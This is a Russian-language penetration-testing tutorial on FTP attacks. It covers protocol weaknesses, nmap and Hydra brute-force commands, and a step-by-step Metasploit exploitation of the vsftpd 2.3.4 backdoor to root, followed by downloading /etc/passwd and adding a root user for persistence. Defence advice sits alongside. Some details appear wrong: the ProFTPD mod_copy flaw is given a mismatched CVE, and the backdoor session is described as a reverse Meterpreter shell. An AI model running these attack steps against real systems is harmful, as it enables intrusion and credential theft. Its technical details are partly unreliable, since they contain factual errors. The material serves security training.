# Атаки на FTP: векторы эксплуатации, уязвимости и методы защиты

## Контекст и базовые понятия

FTP (File Transfer Protocol, протокол передачи файлов) — это стандартный сетевой протокол прикладного уровня (OSI Layer 7), предназначенный для передачи файлов между клиентом и сервером в компьютерной сети. Протокол определен в RFC 959 (1985 г.) и является одним из старейших сетевых протоколов, сохранивших широкое применение, несмотря на наличие критических архитектурных недостатков. В контексте тестирования на проникновение и информационной безопасности FTP представляет собой высокоценную цель из-за своей исторической распространенности, наличия уязвимых реализаций и, что наиболее важно, принципа работы с передачей учетных данных в открытом виде.

Ключевая особенность FTP, определяющая его уязвимость, заключается в разделении каналов управления и данных. Для управления сессией (аутентификация, команды) используется одно TCP-соединение (по умолчанию порт 21), а для передачи самих файлов — другое TCP-соединение (порт 20 в активном режиме или динамический порт в пассивном). Это разделение создает сложную архитектуру, требующую открытия широкого диапазона портов на межсетевых экранах, что расширяет поверхность атаки. Кроме того, базовый протокол FTP не шифрует ни метаданные, ни полезную нагрузку, что делает его подверженным атакам типа «человек посередине» (MitM) и сниффингу.

В современной инфраструктуре понятие «FTP» часто размывается из-за наличия производных протоколов, которые внешне похожи, но имеют разный уровень безопасности. Для специалиста по безопасности критически важно разграничивать следующие сущности:

1.  **FTP (Clear-text):** Базовый протокол без шифрования. Учетные данные и данные передаются в открытом виде. Подвержен перехвату.
2.  **FTPS (FTP over SSL/TLS):** Расширение FTP, добавляющее слой шифрования SSL/TLS. Может работать в явном (Explicit, порт 21 с переходом на TLS) или неявном (Implicit, порт 990) режиме.
3.  **SFTP (SSH File Transfer Protocol):** Протокол, не имеющий отношения к FTP. Является подсистемой SSH (Secure Shell) и передает файлы поверх зашифрованного SSH-туннеля. Использует порт 22 по умолчанию.
4.  **SCP (Secure Copy):** Еще один протокол поверх SSH, использующий другой механизм передачи, но обеспечивающий аналогичный уровень безопасности.

Путаница между FTP и SFTP является распространенной ошибкой при аудите. SFTP безопасен по умолчанию, если правильно настроен, тогда как FTP безопасен только при использовании FTPS. В рамках атак на сетевые сервисы фокус делается именно на уязвимостях базового FTP и неправильной конфигурации FTPS.

| Характеристика | FTP (Clear-text) | FTPS (Explicit) | SFTP |
| :--- | :--- | :--- | :--- |
| **Протокол транспорта** | TCP | TCP + SSL/TLS | TCP (SSH) |
| **Порт по умолчанию** | 21 (управление), 20 (данные) | 21 (управление), динамический (данные) | 22 |
| **Шифрование данных** | Нет | Да (по запросу клиента) | Да (всегда) |
| **Шифрование команд** | Нет | Да (после handshake) | Да (всегда) |
| **Аутентификация** | Clear-text (LOGIN) | Clear-text или Cert-based | Public Key / Password |
| **Сложность NAT** | Высокая (Active/Pasv) | Высокая (Active/Pasv) | Низкая (один порт) |
| **Типичные векторы атак** | Сниффинг, Brute-force, FXP | Misconfiguration, Weak Ciphers | Brute-force SSH, Exploit |

Исторически FTP был разработан в эпоху доверенных сетей, где конфиденциальность не рассматривалась как приоритет. Сегодня использование чистого FTP в публичных сетях считается критическим нарушением политик безопасности. Однако он все еще широко встречается во внутренних сетях (Intranet), в IoT-устройствах, старых промышленных системах (SCADA/ICS) и легаси-инфраструктурах. Для тестировщика на проникновение умение работать с FTP, выявлять его уязвимости и эксплуатировать их для получения доступа к файловой системе или повышения привилегий является базовым навыком.

## Внутреннее устройство предмета

Для понимания механизмов атак необходимо разобрать внутреннюю архитектуру протокола FTP, его состояние и фазы взаимодействия. FTP — это текстовый протокол, работающий по модели «запрос-ответ». Клиент отправляет команды, сервер отвечает кодами состояния.

### Архитектура и фазы сессии

Сессия FTP состоит из нескольких четко определенных фаз:

1.  **Handshake (Установление соединения):** Клиент инициирует TCP-соединение с портом 21 сервера. Сервер отправляет приветственное сообщение (Banner), содержащее версию ПО и иногда информацию об ОС.
2.  **Аутентификация:** Клиент отправляет команды `USER` и `PASS`. В базовом FTP эти данные передаются в открытом виде. Поддерживается также аутентификация `AUTH TLS` для перехода в режим FTPS.
3.  **Настройка канала данных:** Перед передачей файлов необходимо установить второе TCP-соединение. Здесь кроется главная архитектурная сложность. Существует два режима:
    *   **Active Mode (Активный режим):** Клиент отправляет команду `PORT <h1,h2,h3,h4,p1,p2>`, указывая свой IP и порт. Сервер инициирует соединение с клиента с порта 20 на указанный порт. Это вызывает проблемы с NAT и фаерволами клиента.
    *   **Passive Mode (Пассивный режим):** Клиент отправляет команду `PASV`. Сервер отвечает IP и диапазоном портов (`227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)`). Клиент сам инициирует соединение с сервером. Это предпочтительно для клиентов за NAT, но требует открытия широкого диапазона портов на сервере.
4.  **Передача данных:** Использование команд `RETR` (скачать), `STOR` (загрузить), `LIST` (список файлов). Данные передаются по второму каналу.
5.  **Завершение:** Команды `QUIT` или `ABOR`.

### Уязвимости реализации и протокола

Атаки на FTP делятся на несколько категорий в зависимости от того, на каком уровне эксплуатируется уязвимость.

**1. Сниффинг и перехват учетных данных (Credential Harvesting)**
Поскольку аутентификация происходит в открытом виде, любой участник сети, имеющий доступ к трафику (например, через ARP-spoofing или зеркальный порт на коммутаторе), может перехватить логин и пароль.
*   *Механизм:* Перехват пакетов `USER admin` и `PASS secret123`.
*   *Индикаторы:* В дампе pcap видны команды FTP в виде читаемого текста.

**2. Атаки на канал данных (Data Channel Attacks)**
Уязвимость режима Active Mode позволяет атакующему, находящемуся в той же подсети, что и FTP-сервер, инициировать ложное соединение с FTP-клиентом, подменяя IP-адрес в команде `PORT`. Это может привести к:
*   **FTP Bounce Attack (Port 21 Attack):** Атакующий использует FTP-сервер как прокси для сканирования других портов целевой системы. Клиент отправляет команду `PORT <IP_атакующего,Порт>`, а затем `RETR /dev/tcp` или аналогичную команду, заставляя сервер подключиться к указанному порту. Это позволяет обойти межсетевые экраны, блокирующие входящие соединения от клиента.
*   **Сниффинг данных:** Если клиент использует Active Mode, а атакующий может перехватывать трафик на сервере, он может видеть содержимое передаваемых файлов.

**3. Brute-force и перебор учетных данных**
FTP часто используется с учетными записями с простыми паролями или стандартными учетными данными (anonymous, ftp, admin).
*   *Механизм:* Автоматизированный перебор логинов и паролей через API протокола.
*   *Индикаторы:* Высокая частота запросов `USER`/`PASS` с кодами ответа `530` (Login incorrect) или `230` (Login successful) от разных источников.

**4. Уязвимости конкретных реализаций (FTP Server Software)**
Многие FTP-серверы (особенно старые версии vsftpd, ProFTPD, IIS FTP) содержат уязвимости переполнения буфера, инъекции команд или ошибки в логике обработки пассивных режимов.
*   *Пример:* CVE-2011-2523 (vsftpd 2.3.4 backdoor). В версии 2.3.4 была встроена бэкдор-функция, открывающая порт 6200.
*   *Пример:* CVE-2021-3516 (ProFTPD). Уязвимость в модуле `mod_copy`, позволяющая копировать файлы между директориями без аутентификации, если директория доступна для чтения.

**5. Анонимный доступ (Anonymous Login)**
Многие FTP-серверы по умолчанию разрешают вход под логином `anonymous` или `ftp` с паролем, обычно являющимся email-адресом или пустым. Это позволяет атакующему просматривать, загружать и иногда загружать файлы в публичные директории.
*   *Риск:* Злоумышленник может загрузить вредоносный скрипт, который затем будет выполнен администратором или другим пользователем, либо скачать конфиденциальные данные.

| Тип атаки | Уровень эксплуатации | Необходимые условия | Потенциальный ущерб |
| :--- | :--- | :--- | :--- |
| **Сниффинг паролей** | Сеть (Layer 2/3) | Доступ к трафику (LAN/WAN) | Компрометация учетных данных |
| **FTP Bounce** | Сеть (Layer 3/4) | Active Mode, доступ к порту 21 | Обход фаервола, сканирование портов |
| **Brute-force** | Приложение (Layer 7) | Открытый порт 21, слабые пароли | Несанкционированный доступ |
| **Exploit Server** | Приложение (Layer 7) | Уязвимая версия FTP-сервера | RCE (Remote Code Execution) |
| **Anonymous Upload** | Приложение (Layer 7) | Включен анонимный доступ | Загрузка вредоносного ПО |

## Применение и работа с предметом

На практике тестировщик на проникновение использует FTP для сбора информации, получения доступа к файловой системе и дальнейшего перемещения по сети. Работа с FTP включает в себя использование специализированных инструментов для автоматизации атак и анализа уязвимостей.

### Инструментарий и методы анализа

**1. Nmap (Network Mapper)**
Nmap является основным инструментом для обнаружения FTP-серверов и оценки их безопасности. Скрипты NSE (Nmap Scripting Engine) позволяют автоматизировать проверку на распространенные уязвимости.

*   *Обнаружение службы:*
    ```bash
    nmap -p 21 <target_ip>
    ```
    *Вывод:* Определяет, открыт ли порт 21, и версию службы (например, `vsftpd 3.0.3`).

*   *Проверка на анонимный доступ:*
    ```bash
    nmap --script ftp-anon -p 21 <target_ip>
    ```
    *Вывод:* Если анонимный доступ разрешен, скрипт покажет список доступных файлов и директорий. Если доступ запрещен, будет выдано предупреждение.

*   *Проверка на уязвимости (Brute-force, версии, скрипты):*
    ```bash
    nmap --script ftp-brute,ftp-vsftpd-backdoor,ftp-proftpd-capabilities -p 21 <target_ip>
    ```
    *Вывод:* Скрипт `ftp-vsftpd-backdoor` проверяет наличие бэкдора в vsftpd. `ftp-brute` пытается подобрать учетные данные (требует словарей).

**2. Metasploit Framework**
Metasploit предоставляет модули для эксплуатации уязвимостей FTP-серверов.

*   *Модуль сканирования:*
    ```bash
    use auxiliary/scanner/ftp/ftp_version
    set RHOSTS <target_ip>
    run
    ```
*   *Модуль эксплуатации (пример для vsftpd 2.3.4):*
    ```bash
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS <target_ip>
    run
    ```
    *Ожидаемый результат:* При успешной эксплуатации открывается обратная оболочка (reverse shell) на порт 6200.

**3. Hydra / Medusa**
Инструменты для атак перебором (brute-force) по протоколам.

*   *Команда для Hydra:*
    ```bash
    hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>
    ```
    *Пояснение:* `-l` задает логин, `-P` — файл со словами. Hydra быстро перебирает комбинации, используя многопоточность.

**4. FileZilla / Curl / LFTP**
Для ручной работы и загрузки/выгрузки файлов.

*   *Curl (командная строка):*
    ```bash
    curl -u username:password ftp://<target_ip>/path/to/file
    ```
*   *LFTP (продвинутый клиент):*
    ```bash
    lftp -u username,password ftp://<target_ip>
    ```
    LFTP поддерживает автоматизацию, зеркалирование директорий и работу с пассивным режимом.

### Типичные ошибки и подводные камни

1.  **Неправильная интерпретация результатов Nmap:** Nmap может не определить версию FTP-сервера, если сервер использует нестандартный баннер или шифрование. Всегда проверяйте вручную с помощью `nc` или `telnet`.
2.  **Игнорирование пассивного режима:** При тестировании загрузки файлов в пассивном режиме необходимо убедиться, что диапазон портов открыт на фаерволе. Если порт закрыт, загрузка не пройдет, но это не означает отсутствие уязвимости.
3.  **Ложные срабатывания brute-force:** Некоторые FTP-серверы блокируют IP-адрес после нескольких неудачных попыток. Это может помешать полному перебору. Используйте задержки (`-s` в Hydra) или меняйте источники атаки.
4.  **Конфликт Active/Pasv Mode:** При использовании инструментов вроде Metasploit или Nmap, убедитесь, что они настроены на правильный режим. По умолчанию большинство современных клиентов используют Pasv.

### Паттерны детекции и защиты

Для защиты FTP-серверов от атак применяются следующие меры:

1.  **Отключение анонимного доступа:** Запрет входа под `anonymous` и `ftp`.
2.  **Использование FTPS или SFTP:** Переход на зашифрованные протоколы.
3.  **Ограничение диапазона пассивных портов:** Вместо открытия всего диапазона (1024-65535) настроить конкретный узкий диапазон (например, 50000-50010) и открыть его на фаерволе.
4.  **Блокировка Active Mode:** Запрет команды `PORT` на фаерволе, чтобы предотвратить атаки FTP Bounce.
5.  **Регулярное обновление ПО:** Устранение известных уязвимостей (CVE).
6.  **Внедрение Fail2Ban:** Блокировка IP-адресов после нескольких неудачных попыток входа.

## Сквозной практический пример: Эксплуатация уязвимости vsftpd 2.3.4

**Исходные условия:**
*   **Цель:** Виртуальная машина с уязвимым FTP-сервером vsftpd версии 2.3.4 (Linux).
*   **Атакующий:** Kali Linux.
*   **Инструменты:** Nmap, Metasploit Framework.
*   **Сценарий:** Тестирование на проникновение выявило открытый порт 21 и уязвимую версию vsftpd. Цель — получить удаленное выполнение кода (RCE).

**Шаг 1: Разведка и подтверждение уязвимости**
Первым делом необходимо подтвердить, что на цели запущен именно vsftpd 2.3.4, и проверить наличие бэкдора.

```bash
nmap -p 21 --script ftp-vsftpd-backdoor <target_ip>
```

*Ожидаемый вывод:*
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd 2.3.4 backdoor
|     State: VULNERABLE
|     Description: The vsFTPD version 2.3.4 contains a backdoor that allows remote code execution.
|     Disclosure date: 2011-07-04
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|_      https://www.exploit-db.com/exploits/17405
```
*Результат:* Уязвимость подтверждена. Бэкдор активен.

**Шаг 2: Эксплуатация через Metasploit**
Используем готовый модуль Metasploit для автоматизации атаки.

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_ip>
run
```

*Ожидаемый вывод:*
```text
[*] Started reverse TCP handler on <attacker_ip>:4444
[*] Connected to <target_ip>:6200...
[+] Backdoor service has been spawned, handling connection.
[+] Upgrading to a root shell via backdoor...
[*] Meterpreter session 1 opened (<attacker_ip>:4444 -> <target_ip>:6200) at 2023-10-27 10:00:00 +0000
```
*Результат:* Получена сессия Meterpreter с правами root.

**Шаг 3: Пост-эксплуатация и сбор данных**
После получения доступа необходимо собрать информацию о системе и файлах.

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ls /etc/shadow
meterpreter > download /etc/passwd
```

*Ожидаемый вывод:*
```text
Computer: 192.168.1.100
OS:       Linux 2.6.32 (x86_64)
Meterpreter : x86/linux
[+] Downloaded file: /tmp/passwd
```
*Результат:* Получена информация об ОС и скачан файл паролей для дальнейшего анализа.

**Шаг 4: Персистентность (опционально)**
Для сохранения доступа можно добавить нового пользователя или изменить существующий.

```bash
meterpreter > run post/linux/manage/add_user
```
*Результат:* Создан новый пользователь с правами root.

**Ожидаемый вывод:**
Пример демонстрирует, как устаревшая версия FTP-сервера с известной бэкдор-уязвимостью позволяет атакующему получить полный контроль над системой без необходимости подбора паролей. Это подчеркивает важность обновления ПО и мониторинга версий сервисов.

## Аналитический вывод

FTP, несмотря на свою возрастность, остается значимым вектором атак в корпоративных и промышленных сетях. Его уязвимость обусловлена не только передачей данных в открытом виде, но и сложной архитектурой каналов управления и данных, которая создает возможности для обхода межсетевых экранов (FTP Bounce) и перехвата трафика. Ключевым риском является использование FTP в легаси-системах, где обновление ПО невозможно или затруднено.

Для специалистов по безопасности критически важно не только обнаруживать FTP-серверы с помощью инструментов вроде Nmap, но и оценивать их конфигурацию: наличие анонимного доступа, версию ПО, режимы работы (Active/Pasv) и поддержку шифрования. Эксплуатация уязвимостей FTP часто приводит к полному компрометации системы, как в случае с vsftpd 2.3.4.

Меры защиты должны включать переход на SFTP или FTPS, ограничение доступа к пассивным портам, отключение анонимного входа и регулярный аудит версий ПО. В условиях современного тестирования на проникновение FTP часто используется как начальная точка для перемещения по сети (lateral movement), поэтому его обнаружение и нейтрализация являются приоритетными задачами при аудите инфраструктуры.
